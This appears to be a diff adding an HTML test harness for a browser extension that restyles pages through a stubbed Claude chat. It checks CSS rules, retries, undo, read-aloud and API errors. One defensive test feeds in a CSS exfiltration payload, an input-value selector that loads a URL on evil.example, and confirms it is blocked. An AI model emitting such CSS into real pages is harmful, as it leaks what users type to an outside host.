@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<title>running</title>
+		<script src="chrome-mock.js"></script>
+		<script>
+			// Side panel chat pipeline with a stubbed Claude API (no network, no cost).
+			const HOST = 'news.example.com';
+			const OUTLINE = 'header.top {sticky}\n  nav "Home News"\naside.sidebar @800,60 300x900 "Most read"\ndiv.cookie {fixed} "We use cookies"';
+			const MATCHES = { 'aside.sidebar': 1, 'div.cookie': 1, '.does-not-exist': 0 };
+			window.__tabMessages = [];
+			Object.assign(chrome, {
+				windows: { getCurrent: async () => ({ id: 1 }) },
+				tabs: {
+					query: async () => [{ id: 7, url: `https://${HOST}/story` }],
+					async sendMessage(id, msg) {
+						__tabMessages.push(msg);
+						if (msg.type === 'cp:outline') return { url: `https://${HOST}/story`, title: 'Story', viewport: '1200x800', outline: OUTLINE, picked: null };
+						if (msg.type === 'cp:count') return msg.selectors.map((s) => MATCHES[s] ?? 0);
+					},
+					onActivated: { addListener() {} },
+					onUpdated: { addListener() {} }
+				},
+				tts: { getVoices: (cb) => cb([]) }
+			});
+			chrome.runtime.sendMessage = async (m) => (window.__sentMessages.push(m), m.type === 'tts:get' ? { state: 'idle', i: 0, n: 0 } : undefined);
+			window.LanguageModel = undefined;
+
+			// Canned Claude responses, consumed in order.
+			window.__requests = [];
+			window.__responses = [];
+			const reply = (result, usage = { input_tokens: 1500, cache_read_input_tokens: 700, cache_creation_input_tokens: 0, output_tokens: 80 }) => ({
+				stop_reason: 'end_turn',
+				usage,
+				content: [{ type: 'text', text: JSON.stringify(result) }]
+			});
+			const noSettings = { fontScale: null, removeBackgrounds: null, theme: null, removeImages: null, removeAds: null };
+			window.fetch = async (url, init) => {
+				__requests.push({ url, headers: init.headers, body: JSON.parse(init.body) });
+				return new Response(JSON.stringify(__responses.shift()), { status: 200 });
+			};
+
+			const xhr = new XMLHttpRequest();
+			xhr.open('GET', '../extension/sidepanel.html', false);
+			xhr.send();
+			const doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
+
+			document.addEventListener('DOMContentLoaded', async () => {
+				const results = [];
+				let failed = 0;
+				const check = (name, ok, detail = '') => {
+					results.push(`${ok ? 'ok  ' : 'FAIL'} ${name}${ok ? '' : ' -> ' + detail}`);
+					if (!ok) failed++;
+				};
+				const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+				const store = async (k) => (await chrome.storage.local.get(k))[k];
+				try {
+					document.body.innerHTML = doc.body.innerHTML;
+					await import('../extension/sidepanel.js');
+					await wait(50);
+					const send = async (text) => {
+						document.getElementById('chat-input').value = text;
+						document.getElementById('chat-form').requestSubmit();
+						await wait(150);
+					};
+					const lastBot = () => [...document.querySelectorAll('#log .msg.bot')].at(-1);
+
+					// 1. No AI configured: explains instead of failing.
+					await send('hide the sidebar');
+					check('asks for an API key when no AI is available', lastBot().classList.contains('error') && document.getElementById('settings').open, lastBot().textContent);
+					check('no request made without a key', __requests.length === 0);
+
+					// 2. Local command: free, no request.
+					await send('dark mode');
+					const s = await store('cp:settings');
+					check('local command applies settings', s?.noBg === true && s?.theme === 'dark', JSON.stringify(s));
+					check('local command shows free', lastBot().textContent.includes('free'), lastBot().textContent);
+					check('local command makes no request', __requests.length === 0);
+
+					// 3. Claude request.
+					await chrome.storage.local.set({ 'cp:ai': { provider: 'auto', model: 'claude-haiku-5-5', apiKey: 'sk-test', speakReplies: false, spent: 0, requests: 0 } });
+					await wait(20);
+					__responses.push(reply({ reply: 'I hid the sidebar.', css: 'aside.sidebar{display:none}', replaceExisting: false, settings: noSettings, read: '' }));
+					await send('hide the sidebar');
+					const req = __requests[0];
+					check('calls the Messages API', req?.url === 'https://api.anthropic.com/v1/messages');
+					check('sends API key and browser-access headers', req?.headers['x-api-key'] === 'sk-test' && req?.headers['anthropic-dangerous-direct-browser-access'] === 'true');
+					check('uses Haiku 5.5 by default', req?.body.model === 'claude-haiku-5-5', req?.body.model);
+					check('uses structured outputs', req?.body.output_config.format.type === 'json_schema');
+					check('low effort for speed and cost', req?.body.output_config.effort === 'low');
+					check('caches the system prompt', req?.body.system[0].cache_control?.type === 'ephemeral');
+					check('sends the page outline, not raw HTML', req?.body.messages.at(-1).content.includes('aside.sidebar @800,60'));
+					let site = await store('cp:site:' + HOST);
+					check('saves hardened CSS as a site rule', site?.rules[0]?.css === 'aside.sidebar { display: none !important; }', JSON.stringify(site));
+					check('shows reply with cost', lastBot().textContent.includes('I hid the sidebar.') && lastBot().textContent.includes('$0.0002'), lastBot().textContent);
+					const ai = await store('cp:ai');
+					check('tracks spend', ai.requests === 1 && ai.spent > 0, JSON.stringify(ai));
+					check('saved rule listed', document.querySelector('#rules li span')?.textContent === 'hide the sidebar');
+
+					// 4. Follow-up: history is sent without the old outline; selectors that match nothing trigger one retry.
+					__responses.push(reply({ reply: 'Hid it.', css: '.does-not-exist{display:none}', replaceExisting: false, settings: noSettings, read: '' }));
+					__responses.push(reply({ reply: 'I hid the cookie banner.', css: 'div.cookie{display:none}', replaceExisting: false, settings: { ...noSettings, removeAds: true }, read: '' }));
+					await send('also remove the cookie popup');
+					check('retries once when selectors match nothing', __requests.length === 3, __requests.length);
+					check('retry explains the problem', __requests[2]?.body.messages.at(-1).content.includes('matched nothing'));
+					const follow = __requests[1]?.body.messages;
+					check('follow-up includes previous turn', follow?.length === 3 && follow[0].content === 'REQUEST: hide the sidebar', JSON.stringify(follow?.map((m) => m.content.slice(0, 40))));
+					site = await store('cp:site:' + HOST);
+					check('second rule saved', site?.rules.length === 2 && site.rules[1].css.includes('div.cookie'), JSON.stringify(site));
+					check('AI can flip built-in switches', (await store('cp:settings')).noAds === true);
+
+					// 5. Undo button removes that rule.
+					lastBot().querySelector('.meta button').click();
+					await wait(50);
+					site = await store('cp:site:' + HOST);
+					check('undo removes the rule', site.rules.length === 1 && site.rules[0].css.includes('sidebar'), JSON.stringify(site));
+
+					// 6. Unsafe CSS from the model is not applied.
+					__responses.push(reply({ reply: 'Done.', css: 'input[value^="a"]{background:url(https://evil.example/a)}', replaceExisting: false, settings: noSettings, read: '' }));
+					await send('style the inputs');
+					site = await store('cp:site:' + HOST);
+					check('unsafe CSS is blocked', site.rules.length === 1 && lastBot().textContent.includes('skipped'), lastBot().textContent);
+
+					// 7. "read me X" starts reading that part.
+					__responses.push(reply({ reply: 'Reading the sidebar.', css: '', replaceExisting: false, settings: noSettings, read: 'aside.sidebar' }));
+					await send('read me the most read list');
+					check('read request starts reader on selector', __sentMessages.some((m) => m.type === 'tts:start' && m.selector === 'aside.sidebar'));
+
+					// 8. API errors are friendly.
+					window.fetch = async () => new Response(JSON.stringify({ error: { message: 'invalid x-api-key' } }), { status: 401 });
+					await send('make the header blue');
+					check('401 shows a helpful message', lastBot().textContent.includes('API key was rejected'), lastBot().textContent);
+				} catch (e) {
+					results.push('ERROR ' + e.stack);
+					failed++;
+				}
+				document.body.innerHTML = '<pre id="results"></pre>';
+				document.getElementById('results').textContent = results.join('\n');
+				document.title = failed ? `FAIL ${failed}` : `PASS ${results.filter((x) => x.startsWith('ok')).length}`;
+			});
+		</script>
+	</head>
+	<body></body>
+</html>
